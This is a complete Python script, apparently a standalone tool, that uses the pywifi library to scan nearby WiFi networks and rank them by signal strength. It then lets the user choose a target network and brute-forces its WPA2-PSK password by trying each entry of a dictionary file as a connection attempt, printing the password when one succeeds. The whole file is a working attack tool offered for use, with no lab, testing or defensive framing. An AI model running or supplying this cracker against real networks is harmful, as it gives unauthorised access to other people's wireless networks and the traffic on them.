import pywifi
import time
from pywifi import const
 
# WiFi scanner
def wifi_scan():
    # initialise wifi
    wifi = pywifi.PyWiFi()
    # use the first interface
    interface = wifi.interfaces()[0]
    # start scan
    interface.scan()
    for i in range(4):
        time.sleep(1)
        print('\rScanning WiFi, please wait...（' + str(3 - i), end='）')
    print('\rScan Completed！\n' + '-' * 38)
    print('\r{:4}{:6}{}'.format('No.', 'Strength', 'wifi name'))
    # Scan result，scan_results() returns a set, each being a wifi object
    bss = interface.scan_results()
    # a set storing wifi name
    wifi_name_set = set()
    for w in bss:
        # dealing with decoding
        wifi_name_and_signal = (100 + w.signal, w.ssid.encode('raw_unicode_escape').decode('utf-8'))
        wifi_name_set.add(wifi_name_and_signal)
    # store into a list sorted by signal strength
    wifi_name_list = list(wifi_name_set)
    wifi_name_list = sorted(wifi_name_list, key=lambda a: a[0], reverse=True)
    num = 0
    # format output
    while num < len(wifi_name_list):
        print('\r{:<6d}{:<8d}{}'.format(num, wifi_name_list[num][0], wifi_name_list[num][1]))
        num += 1
    print('-' * 38)
    # return wifi list
    return wifi_name_list
 
# WIFI cracking function
def wifi_password_crack(wifi_name):
    # password dictionary file
    wifi_dic_path = input("Please use filename of password dictionary used for the brute force attack: ")
    with open(wifi_dic_path, 'r') as f:
        # loop through all combinations
        for pwd in f:
            # strip of the trailing new line character
            pwd = pwd.strip('\n')
            # initialise wifi object
            wifi = pywifi.PyWiFi()
            # initialise interface using the first one
            interface = wifi.interfaces()[0]
            # disconnect all other connections
            interface.disconnect()
            # waiting for all disconnection to complete
            while interface.status() == 4:
                # break from the loop once all disconnection complete
                pass
            # initialise profile
            profile = pywifi.Profile()
            # wifi name
            profile.ssid = wifi_name
            # need verification
            profile.auth = const.AUTH_ALG_OPEN
            # wifi default encryption algorithm
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            # wifi password
            profile.key = pwd
            # remove all wifi connection profiles
            interface.remove_all_network_profiles()
            # set new wifi connection profile
            tmp_profile = interface.add_network_profile(profile)
            # attempting new connection
            interface.connect(tmp_profile)
            start_time = time.time()
            while time.time() - start_time < 1.5:
                # when interface connection status is 4, it succeeds
                # greater than 1.5s normally means the connection failed
                # normal successful connection is completed in 1.5s 
                # increase the timer to increase the accuracy at the cost of slower speed
                if interface.status() == 4:
                    print(f'\rConnection Succeeded！Password：{pwd}')
                    exit(0)
                else:
                    print(f'\rTrying with {pwd}', end='')
# main execution function
def main():
    # exit signal
    exit_flag = 0
    # target number
    target_num = -1
    while not exit_flag:
        try:
            print('WiFi keys'.center(35, '-'))
            # use the scanner module，to get a sorted wifi list
            wifi_list = wifi_scan()
            # let the user pick the wifi number， and handle error cases
            choose_exit_flag = 0
            while not choose_exit_flag:
                try:
                    target_num = int(input('Please choose a target wifi：'))
                    # choose wifi in the list，go into second confirmation or ask for input again
                    if target_num in range(len(wifi_list)):
                        # double-confirm
                        while not choose_exit_flag:
                            try:
                                choose = str(input(f'The chosen target wifi is：{wifi_list[target_num][1]}，Sure?（Y/N）'))
                                # lower case the confirmation input
                                if choose.lower() == 'y':
                                    choose_exit_flag = 1
                                elif choose.lower() == 'n':
                                    break
                                # exception handling
                                else:
                                    print('only Y/N pls! o(*￣︶￣*)o')
                            # exception handling
                            except ValueError:
                                print('only Y/N pls! o(*￣︶￣*)o')
                        # exit
                        if choose_exit_flag == 1:
                            break
                        else:
                            print('Please choose a target wifi: ')
                except ValueError:
                    print('Please only enter a number: ')
            # start cracking，use the chosen wifi name
            wifi_password_crack(wifi_list[target_num][1])
            print('-' * 38)
            exit_flag = 1
        except Exception as e:
            print(e)
            raise e
 
 
if __name__ == '__main__':
    main()

